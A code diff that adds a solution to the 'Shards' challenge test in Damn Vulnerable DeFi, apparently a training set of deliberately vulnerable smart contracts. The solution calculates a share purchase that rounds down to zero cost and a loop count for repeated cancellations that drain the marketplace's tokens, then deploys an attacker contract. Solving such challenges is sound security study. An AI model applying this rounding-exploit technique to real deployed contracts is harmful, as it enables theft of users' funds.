@@ -11,6 +11,8 @@ import {
     DamnValuableNFT
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
+import {Attacker} from "./Attacker.sol";
+import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -114,7 +116,13 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        // want * (price * rate) / 1e6 / totalShards < 1
+        // want < 1e6 * totalShards / (price * rate)
+        uint256 want = FixedPointMathLib.mulDivDown(1e6, NFT_OFFER_SHARDS, NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE);
+        uint256 singleCancelPayoff = FixedPointMathLib.mulDivUp(want, MARKETPLACE_INITIAL_RATE, 1e6);
+        uint256 missingAmount = initialTokensInMarketplace * 1e16 / 100e18;
+        uint256 loop = missingAmount / singleCancelPayoff + 1;
+        new Attacker(marketplace, token, recovery, want, loop);
     }
 
     /**
